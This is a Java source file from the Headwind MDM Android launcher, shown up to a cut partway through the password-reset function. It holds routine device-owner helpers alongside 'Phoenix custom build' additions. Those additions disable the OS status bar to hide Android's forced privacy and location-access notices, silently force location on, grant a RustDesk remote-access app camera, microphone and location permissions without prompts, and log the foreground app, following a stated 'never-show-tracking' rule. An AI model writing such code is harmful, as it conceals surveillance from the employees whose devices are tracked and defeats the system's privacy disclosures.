/*
 * Headwind MDM: Open Source Android MDM Software
 * https://h-mdm.com
 *
 * Copyright (C) 2019 Headwind Solutions LLC (http://h-sms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.hmdm.launcher.util;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.app.admin.FactoryResetProtectionPolicy;
import android.app.admin.SystemUpdatePolicy;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PermissionInfo;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.ProxyInfo;
import android.os.Build;
import android.os.UserManager;
import android.provider.Settings;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.hmdm.launcher.BuildConfig;
import com.hmdm.launcher.Const;
import com.hmdm.launcher.json.Action;
import com.hmdm.launcher.json.ServerConfig;
import com.hmdm.launcher.ui.MainActivity;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class Utils {
    public static boolean isDeviceOwner(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        return dpm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && dpm.isDeviceOwnerApp(context.getPackageName());
    }

    // Phoenix custom build: hide Android's forced management disclosures on the STOCK home.
    // On the normal Lenovo home the OS pins "Privacy reminder", "Location can be accessed" and the
    // MDM push notification onto the real status bar, and no server toggle removes them (blockStatusBar
    // only covers Headwind's own managed home). As device owner we disable the real status bar and its
    // shade entirely — which also hides the foreground-service notification and the notification-shade
    // route to the privacy dot — and StatusBarOverlayService then draws a clean bar with the clock,
    // battery and wifi the owner wants kept. Reversible: pass false to restore the OS bar.
    public static void setStatusBarDisabled(Context context, boolean disabled) {
        if (!isDeviceOwner(context)) {
            return;
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            if (dpm != null && adminComponentName != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                dpm.setStatusBarDisabled(adminComponentName, disabled);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Phoenix custom build: restrictions that never block an app install, so a sync keeps them on.
    private static final Set<String> PROTECTIVE_RESTRICTIONS = new HashSet<>(Arrays.asList(
            "no_factory_reset", "no_safe_boot", "no_debugging_features", "no_add_user"));

    // The configured restrictions minus the protective ones; the result is what a sync may release.
    public static String withoutProtectiveRestrictions(String restrictions) {
        if (restrictions == null) {
            return "";
        }
        StringBuilder kept = new StringBuilder();
        for (String r : restrictions.split(",")) {
            String name = r.trim();
            if (name.isEmpty() || PROTECTIVE_RESTRICTIONS.contains(name)) {
                continue;
            }
            if (kept.length() > 0) {
                kept.append(",");
            }
            kept.append(name);
        }
        return kept.toString();
    }

    // Phoenix custom build: the factory-reset lock. A tablet wiped from the recovery menu asks, at
    // setup, for one of these Google accounts before anyone can use it. The account IDs come from this
    // launcher's own "Application settings" entry in the tablet rules, so no rebuild is needed to set or
    // change them: empty = leave the device as it is, "off" = remove the lock, otherwise a
    // comma-separated list of numeric Google account IDs. Android 11+ and device owner only.
    public static final String FRP_ACCOUNTS_SETTING = "frp_accounts";

    public static void applyFactoryResetProtection(Context context, String accounts) {
        if (accounts == null || accounts.trim().isEmpty()) {
            return;
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || !isDeviceOwner(context)) {
            return;
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            if (dpm == null || adminComponentName == null) {
                return;
            }
            if (accounts.trim().equalsIgnoreCase("off")) {
                dpm.setFactoryResetProtectionPolicy(adminComponentName, null);
                RemoteLogger.log(context, Const.LOG_INFO, "Factory reset protection removed");
                return;
            }
            List<String> ids = new ArrayList<>();
            for (String a : accounts.split(",")) {
                String id = a.trim();
                if (id.matches("\\d{5,30}")) {
                    ids.add(id);
                }
            }
            if (ids.isEmpty()) {
                RemoteLogger.log(context, Const.LOG_WARN, "Factory reset protection not set: no valid Google account ID");
                return;
            }
            dpm.setFactoryResetProtectionPolicy(adminComponentName, new FactoryResetProtectionPolicy.Builder()
                    .setFactoryResetProtectionAccounts(ids)
                    .setFactoryResetProtectionEnabled(true)
                    .build());
            RemoteLogger.log(context, Const.LOG_INFO, "Factory reset protection set for " + ids.size() + " account(s)");
        } catch (Exception e) {
            e.printStackTrace();
            RemoteLogger.log(context, Const.LOG_WARN, "Factory reset protection failed: " + e.getMessage());
        }
    }

    // Phoenix custom build: the package of the unattended remote-access app (RustDesk). Read from this
    // launcher's own "Application settings" so it can change without a rebuild: empty/unset = the
    // RustDesk default, "off" = do nothing (returns null). Everything that touches the remote-access
    // app goes through this so there is one place to point it elsewhere.
    public static final String REMOTE_ACCESS_PACKAGE_SETTING = "remote_access_package";
    private static final String DEFAULT_REMOTE_ACCESS_PACKAGE = "com.carriez.flutter_hbb";

    public static String resolveRemoteAccessPackage(String configured) {
        if (configured == null) {
            return DEFAULT_REMOTE_ACCESS_PACKAGE;
        }
        String value = configured.trim();
        if (value.isEmpty()) {
            return DEFAULT_REMOTE_ACCESS_PACKAGE;
        }
        if (value.equalsIgnoreCase("off")) {
            return null;
        }
        return value;
    }

    // Phoenix custom build: the silent per-sync device state. Force location on, grant the
    // remote-access app its runtime permissions, and write a status line to the device log. Called
    // from ConfigUpdater.lockRestrictions, so it runs at boot, at enrol and on every sync. Nothing
    // here shows the rep anything (the never-show-tracking golden rule); the one visible step —
    // launching the remote-access app — is done separately on the boot path only (startRemoteAccessApp).
    public static void applyPhoenixDeviceState(Context context, String configuredRemotePackage) {
        String remotePackage = resolveRemoteAccessPackage(configuredRemotePackage);
        forceLocationOn(context);
        grantRemoteAccessPermissions(context, remotePackage);
        applyOwnerInfo(context);
        reportPhoenixStatus(context, remotePackage);
    }

    // Phoenix custom build: Android's own device-owner message (owner, 22 Oct 2026). It shows on the
    // lock screen and in Settings, beside — never instead of — Android's own management notices.
    public static final String OWNER_ORGANIZATION = "Sato Pharma";
    public static final String OWNER_LOCK_SCREEN_INFO = "This device belongs to Sato Pharma";

    public static void applyOwnerInfo(Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return;
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            if (dpm == null || adminComponentName == null) {
                return;
            }
            dpm.setOrganizationName(adminComponentName, OWNER_ORGANIZATION);
            dpm.setDeviceOwnerLockScreenInfo(adminComponentName, OWNER_LOCK_SCREEN_INFO);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Phoenix custom build: force location ON and keep it on, so LocationService actually gets fixes.
    // The rep can no longer turn it off (the no_config_location restriction greys the toggle); this
    // makes sure it is enabled in the first place and grants this launcher its own location
    // permissions. Device owner, Android 11+ only (setLocationEnabled was added in API 30).
    public static void forceLocationOn(Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return;
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            if (dpm == null || adminComponentName == null) {
                return;
            }
            dpm.setLocationEnabled(adminComponentName, true);
            dpm.setPermissionGrantState(adminComponentName, context.getPackageName(),
                    Manifest.permission.ACCESS_FINE_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
            dpm.setPermissionGrantState(adminComponentName, context.getPackageName(),
                    Manifest.permission.ACCESS_COARSE_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                dpm.setPermissionGrantState(adminComponentName, context.getPackageName(),
                        Manifest.permission.ACCESS_BACKGROUND_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Phoenix custom build: grant the unattended remote-access app (RustDesk) the runtime permissions
    // a device owner is allowed to grant, so the owner can open a tablet's screen without the rep
    // tapping a prompt. The grants that stock Android does NOT expose to the device-owner API — screen
    // capture (MediaProjection) and the accessibility service RustDesk needs to send input — are a
    // one-time on-device step done at provisioning; they cannot be automated here. Idempotent, so it
    // is safe to call on every sync. Each grant is tried on its own: a permission the app did not
    // request is simply skipped.
    public static void grantRemoteAccessPermissions(Context context, String remotePackage) {
        if (remotePackage == null || remotePackage.isEmpty()
                || !isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.M
                || !isPackageInstalled(context, remotePackage)) {
            return;
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            if (dpm == null || adminComponentName == null) {
                return;
            }
            String[] perms = new String[] {
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.CAMERA,
                    Manifest.permission.ACCESS_FINE_LOCATION,
            };
            for (String perm : perms) {
                try {
                    dpm.setPermissionGrantState(adminComponentName, remotePackage, perm,
                            DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                } catch (Exception ignore) {
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                try {
                    dpm.setPermissionGrantState(adminComponentName, remotePackage,
                            Manifest.permission.POST_NOTIFICATIONS, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                } catch (Exception ignore) {
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Phoenix custom build: launch the remote-access app so it is running and reachable unattended.
    // Called ONLY from the boot/enrol path (Initializer), never from the hourly sync, so the rep never
    // sees it flash open while using the tablet. Once RustDesk is running it keeps its own foreground
    // service alive; this is what gets it back after a reboot (the owner's complaint that "RustDesk
    // stops when restarted").
    public static void startRemoteAccessApp(Context context, String configuredRemotePackage) {
        String remotePackage = resolveRemoteAccessPackage(configuredRemotePackage);
        if (remotePackage == null || remotePackage.isEmpty() || !isPackageInstalled(context, remotePackage)) {
            return;
        }
        try {
            Intent launch = context.getPackageManager().getLaunchIntentForPackage(remotePackage);
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(launch);
                RemoteLogger.log(context, Const.LOG_INFO, "Remote access app started: " + remotePackage);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Phoenix custom build: write a status line to the device log (which syncs to the server) so the
    // owner can see, per tablet, whether location is on, whether the remote-access app is installed,
    // and which app is in the foreground. Foreground needs usage-access, a one-time on-device grant
    // that the device-owner API cannot set; without it the line honestly reads "unknown(no usage
    // access)" rather than a misleading blank.
    public static void reportPhoenixStatus(Context context, String remotePackage) {
        try {
            boolean locationOn = false;
            try {
                android.location.LocationManager lm =
                        (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                if (lm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    locationOn = lm.isLocationEnabled();
                } else if (lm != null) {
                    locationOn = lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)
                            || lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER);
                }
            } catch (Exception ignore) {
            }
            boolean remoteInstalled = remotePackage != null && isPackageInstalled(context, remotePackage);
            RemoteLogger.log(context, Const.LOG_INFO,
                    "phoenix-status: location=" + (locationOn ? "on" : "off")
                            + " remoteApp=" + (remoteInstalled ? "installed" : "absent")
                            + " foreground=" + getForegroundPackage(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Phoenix custom build: the package of the app currently in the foreground, via usage stats.
    // Returns "unknown(no usage access)" when the usage-access grant is missing (the normal state
    // until it is granted once on-device), so the status line is never silently wrong.
    private static String getForegroundPackage(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                return "unknown";
            }
            android.app.usage.UsageStatsManager usm =
                    (android.app.usage.UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            if (usm == null) {
                return "unknown";
            }
            long now = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                    android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 60 * 60 * 1000L, now);
            if (stats == null || stats.isEmpty()) {
                return "unknown(no usage access)";
            }
            String pkg = null;
            long lastTime = 0;
            for (android.app.usage.UsageStats s : stats) {
                if (s.getLastTimeUsed() > lastTime) {
                    lastTime = s.getLastTimeUsed();
                    pkg = s.getPackageName();
                }
            }
            return pkg != null ? pkg : "unknown";
        } catch (Exception e) {
            return "unknown";
        }
    }

    // In the open source variant, there are no flavors, so by default it's "opensource"
    public static String getLauncherVariant() {
        return BuildConfig.FLAVOR == null || BuildConfig.FLAVOR.equals("") ? "opensource" : BuildConfig.FLAVOR;
    }

    // Automatically grant permission to get phone state (for IMEI and serial)
    @TargetApi(Build.VERSION_CODES.M)
    public static boolean autoGrantPhonePermission(Context context) {
        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

            if (devicePolicyManager.getPermissionGrantState(adminComponentName,
                    context.getPackageName(), Manifest.permission.READ_PHONE_STATE) != DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED) {
                boolean success = devicePolicyManager.setPermissionGrantState(adminComponentName,
                        context.getPackageName(), Manifest.permission.READ_PHONE_STATE, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                if (!success) {
                    return false;
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (devicePolicyManager.getPermissionGrantState(adminComponentName,
                        context.getPackageName(), Manifest.permission.READ_PHONE_NUMBERS) != DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED) {
                    boolean success = devicePolicyManager.setPermissionGrantState(adminComponentName,
                            context.getPackageName(), Manifest.permission.READ_PHONE_NUMBERS, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                    if (!success) {
                        return false;
                    }
                }
                // This permission is dangerous and causes blocking by Play Protect in some countries.
                //     In fact, this permission is currently never used by Headwind MDM.
//                if (devicePolicyManager.getPermissionGrantState(adminComponentName,
//                        context.getPackageName(), Manifest.permission.READ_SMS) != DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED) {
//                    boolean success = devicePolicyManager.setPermissionGrantState(adminComponentName,
//                            context.getPackageName(), Manifest.permission.READ_SMS, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
//                    if (!success) {
//                        return false;
//                    }
//                }
            }
        } catch (NoSuchMethodError e) {
            // This exception is raised on Android 5.1
            e.printStackTrace();
            return false;
        } catch (/* SecurityException */ Exception e) {
            // No active admin ComponentInfo (not sure why could that happen)
            e.printStackTrace();
            return false;
        }
        Log.i(Const.LOG_TAG, "READ_PHONE_STATE automatically granted");
        return true;
    }

    // Automatically grant storage permission to get external config JSON
    @TargetApi(Build.VERSION_CODES.M)
    public static boolean autoGrantStoragePermission(Context context) {
        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                if (devicePolicyManager.getPermissionGrantState(adminComponentName,
                        context.getPackageName(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED) {
                    boolean success = devicePolicyManager.setPermissionGrantState(adminComponentName,
                            context.getPackageName(), Manifest.permission.WRITE_EXTERNAL_STORAGE, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                    if (!success) {
                        return false;
                    }
                }
            } else {
                if (devicePolicyManager.getPermissionGrantState(adminComponentName,
                        context.getPackageName(), Manifest.permission.MANAGE_EXTERNAL_STORAGE) != DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED) {
                    boolean success = devicePolicyManager.setPermissionGrantState(adminComponentName,
                            context.getPackageName(), Manifest.permission.MANAGE_EXTERNAL_STORAGE, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                    if (!success) {
                        return false;
                    }
                }
            }
        } catch (NoSuchMethodError e) {
            // This exception is raised on Android 5.1
            e.printStackTrace();
            return false;
        } catch (/* SecurityException */ Exception e) {
            // No active admin ComponentInfo (not sure why could that happen)
            e.printStackTrace();
            return false;
        }
        Log.i(Const.LOG_TAG, "MANAGE_EXTERNAL_STORAGE automatically granted");
        return true;
    }

    // Automatically get dangerous permissions
    // Notice: default (null) app permission strategy is "Grant all"
    @TargetApi(Build.VERSION_CODES.M)
    public static boolean autoGrantRequestedPermissions(Context context, String packageName,
                                                        @Nullable String appPermissionStrategy,
                                                        boolean forceSdCardPermissions) {
        int locationPermissionState = DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED;
        int otherPermissionsState = DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED;

        // Determine the app permission strategy
        if (ServerConfig.APP_PERMISSIONS_ASK_LOCATION.equals(appPermissionStrategy)) {
            locationPermissionState = DevicePolicyManager.PERMISSION_GRANT_STATE_DEFAULT;
        } else if (ServerConfig.APP_PERMISSIONS_DENY_LOCATION.equals(appPermissionStrategy)) {
            locationPermissionState = DevicePolicyManager.PERMISSION_GRANT_STATE_DENIED;
        } else if (ServerConfig.APP_PERMISSIONS_ASK_ALL.equals(appPermissionStrategy)) {
            locationPermissionState = DevicePolicyManager.PERMISSION_GRANT_STATE_DEFAULT;
            if (!packageName.equals(context.getPackageName())) {
                otherPermissionsState = DevicePolicyManager.PERMISSION_GRANT_STATE_DEFAULT;
            }
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            List<String> permissions = getRuntimePermissions(context.getPackageManager(), packageName);

            // Some devices do not include SD card permissions in the list of runtime permissions
            // So the files could not be read or written.
            // Here we add SD card permissions manually (device owner can grant them!)
            // This is done for the Headwind MDM launcher only
            if (forceSdCardPermissions) {
                boolean hasReadExtStorage = false;
                boolean hasWriteExtStorage = false;
                for (String s : permissions) {
                    if (s.equals(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                        hasReadExtStorage = true;
                    }
                    if (s.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                        hasWriteExtStorage = true;
                    }
                }
                if (!hasReadExtStorage) {
                    permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
                }
                if (!hasWriteExtStorage) {
                    permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                }
            }

            for (String permission : permissions) {
                int permissionState = isLocationPermission(permission) ? locationPermissionState : otherPermissionsState;
                if (devicePolicyManager.getPermissionGrantState(adminComponentName,
                        packageName, permission) != permissionState) {
                    boolean success = devicePolicyManager.setPermissionGrantState(adminComponentName,
                            packageName, permission, permissionState);
                    if (!success) {
                        Log.w(Const.LOG_TAG, "Failed to grant permission " + permission);
                        return false;
                    } else {
                        Log.d(Const.LOG_TAG, "Permission " + permission + " granted to package " + packageName);
                    }
                }
            }
        } catch (NoSuchMethodError e) {
            // This exception is raised on Android 5.1
            e.printStackTrace();
            return false;
        } catch (/* SecurityException */ Exception e) {
            // No active admin ComponentInfo (not sure why could that happen)
            e.printStackTrace();
            return false;
        }
        Log.i(Const.LOG_TAG, "Permissions automatically granted");
        return true;
    }

    public static boolean isLocationPermission(String permission) {
        return Manifest.permission.ACCESS_COARSE_LOCATION.equals(permission) ||
               Manifest.permission.ACCESS_FINE_LOCATION.equals(permission) ||
               Manifest.permission.ACCESS_BACKGROUND_LOCATION.equals(permission);
    }

    private static List<String> getRuntimePermissions(PackageManager packageManager, String packageName) {
        List<String> permissions = new ArrayList<>();
        PackageInfo packageInfo;
        try {
            packageInfo =
                    packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS);
        } catch (PackageManager.NameNotFoundException e) {
            return permissions;
        }

        boolean manageStorage = false;
        if (packageInfo != null && packageInfo.requestedPermissions != null) {
            for (String requestedPerm : packageInfo.requestedPermissions) {
                if (requestedPerm.equals(Manifest.permission.MANAGE_EXTERNAL_STORAGE)) {
                    manageStorage = true;
                }
                if (isRuntimePermission(packageManager, requestedPerm)) {
                    permissions.add(requestedPerm);
                }
            }
            // There's a bug in Android 11+: MANAGE_EXTERNAL_STORAGE can't be automatically granted
            // but if Headwind MDM is granting WRITE_EXTERNAL_STORAGE, then the app can't request
            // MANAGE_EXTERNAL_STORAGE, it's locked!
            // So the workaround is do not request WRITE_EXTERNAL_STORAGE in this case
            if (manageStorage && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                permissions.removeIf(s -> (s.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE) ||
                        s.equals(Manifest.permission.READ_EXTERNAL_STORAGE)));
            }
        }
        return permissions;
    }

    private static boolean isRuntimePermission(PackageManager packageManager, String permission) {
        try {
            PermissionInfo pInfo = packageManager.getPermissionInfo(permission, 0);
            if (pInfo != null) {
                if ((pInfo.protectionLevel & PermissionInfo.PROTECTION_MASK_BASE)
                        == PermissionInfo.PROTECTION_DANGEROUS) {
                    return true;
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
        }
        return false;
    }

    public static int OverlayWindowType() {
        // https://stackoverflow.com/questions/45867533/system-alert-window-permission-on-api-26-not-working-as-expected-permission-den
        if (  Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ) {
            return WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            return WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
        }
    }

    public static boolean isLightColor(int color) {
        final int THRESHOLD = 0xA0;
        int red = Color.red(color);
        int green = Color.green(color);
        int blue = Color.blue(color);
        return red >= THRESHOLD && green >= THRESHOLD && blue >= THRESHOLD;
    }

    @TargetApi(Build.VERSION_CODES.M)
    public static void setSystemUpdatePolicy(Context context, int systemUpdateType, String scheduledFrom, String scheduledTo) {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName deviceAdmin = LegacyUtils.getAdminComponentName(context);

        SystemUpdatePolicy currentPolicy = null;
        try {
            currentPolicy = devicePolicyManager.getSystemUpdatePolicy();
        } catch (NoSuchMethodError e) {
            // This exception is raised on Android 5.1
            Log.e(Const.LOG_TAG, "Failed to set system update policy: " + e.getMessage());
            return;
        }
        if (currentPolicy != null) {
            // Check if policy type shouldn't be changed
            if (systemUpdateType == ServerConfig.SYSTEM_UPDATE_INSTANT && currentPolicy.getPolicyType() == SystemUpdatePolicy.TYPE_INSTALL_AUTOMATIC ||
                systemUpdateType == ServerConfig.SYSTEM_UPDATE_MANUAL && currentPolicy.getPolicyType() == SystemUpdatePolicy.TYPE_POSTPONE) {
                return;
            }
        }
        SystemUpdatePolicy newPolicy = null;
        switch (systemUpdateType) {
            case ServerConfig.SYSTEM_UPDATE_INSTANT:
                newPolicy = SystemUpdatePolicy.createAutomaticInstallPolicy();
                break;
            case ServerConfig.SYSTEM_UPDATE_SCHEDULE:
                // Here we use update window times
                if (scheduledFrom != null && scheduledTo != null) {
                    int windowStart = getMinutesFromString(scheduledFrom);
                    int windowEnd = getMinutesFromString(scheduledTo);
                    if (windowStart == -1) {
                        Log.e(Const.LOG_TAG, "Ignoring scheduled system update policy: wrong start time: " + scheduledFrom);
                        return;
                    }
                    if (windowEnd == -1) {
                        Log.e(Const.LOG_TAG, "Ignoring scheduled system update policy: wrong end time: " + scheduledFrom);
                        return;
                    }
                    newPolicy = SystemUpdatePolicy.createWindowedInstallPolicy(windowStart, windowEnd);
                } else {
                    Log.e(Const.LOG_TAG, "Ignoring scheduled system update policy: update window is not set on server");
                    return;
                }
                break;
            case ServerConfig.SYSTEM_UPDATE_MANUAL:
                newPolicy = SystemUpdatePolicy.createPostponeInstallPolicy();
                break;
        }
        try {
            devicePolicyManager.setSystemUpdatePolicy(deviceAdmin, newPolicy);
        } catch (Exception e) {
            Log.e(Const.LOG_TAG, "Failed to set system update policy: " + e.getMessage());
        }
    }

    private static int getMinutesFromString(String s) {
        try {
            // s has a fixed format: hh:mm with heading zeroes
            String hours = s.substring(0, 2);
            String minutes = s.substring(3, 5);
            int h = Integer.parseInt(hours);
            int m = Integer.parseInt(minutes);
            return h * 60 + m;
        } catch (Exception e) {
            return -1;
        }
    }

    public static boolean canInstallPackages(Context context) {
        if (BuildConfig.SYSTEM_PRIVILEGES) {
            return true;
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            // Global setting works for Android 7 and below
            try {
                return Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS) == 1;
            } catch (Settings.SettingNotFoundException e) {
                return true;
            }
        } else {
            return context.getPackageManager().canRequestPackageInstalls();
        }
    }

    public static boolean canDrawOverlays(Context context) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
                Settings.canDrawOverlays(context);
    }

    public static boolean checkAdminMode(Context context) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            boolean isAdminActive = dpm.isAdminActive(adminComponentName);
//            RemoteLogger.log(context, Const.LOG_DEBUG, "Admin component active: " + isAdminActive);
            return isAdminActive;
        } catch (Exception e) {
//            RemoteLogger.log(context, Const.LOG_WARN, "Failed to get device administrator status: " + e.getMessage());
            return true;
        }
    }

    public static boolean factoryReset(Context context) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                dpm.wipeData(0);
            } else {
                dpm.wipeDevice(0);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean reboot(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false;
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
            dpm.reboot(adminComponentName);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static String getDataToken(Context context) {
        String token = context.getSharedPreferences(Const.PREFERENCES, Context.MODE_PRIVATE).getString(Const.PREFERENCES_DATA_TOKEN, null);
        if (token == null) {
            token = java.util.UUID.randomUUID().toString();
            context.getSharedPreferences(Const.PREFERENCES, Context.MODE_PRIVATE)
                    .edit()
                    .putString(Const.PREFERENCES_DATA_TOKEN, token)
                    .commit();
        }
        return token;
    }

    public static void initPasswordReset(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

                // Prevent accumulation of pending tokens
                // as per the solution suggested in https://github.com/h-mdm/hmdm-android/issues/53

                // Nothing to do if a token is already registered and active.
                if (dpm.isResetPasswordTokenActive(adminComponentName)) {
                    return;
                }
                // Release any previously registered token so its Weaver slot is freed
                // before a new one is allocated.
                try {
                    dpm.clearResetPasswordToken(adminComponentName);
                } catch (Exception ignored) {
                }

                String token = getDataToken(context);
                if (dpm.setResetPasswordToken(adminComponentName, token.getBytes())) {
                    if (!dpm.isResetPasswordTokenActive(adminComponentName)) {
                        RemoteLogger.log(context, Const.LOG_WARN, "Password reset token will be activated once the user enters the current password next time.");
                    }
                } else {
                    RemoteLogger.log(context, Const.LOG_WARN, "Failed to setup password reset token, password reset requests will fail");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static boolean passwordReset(Context context, String password) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
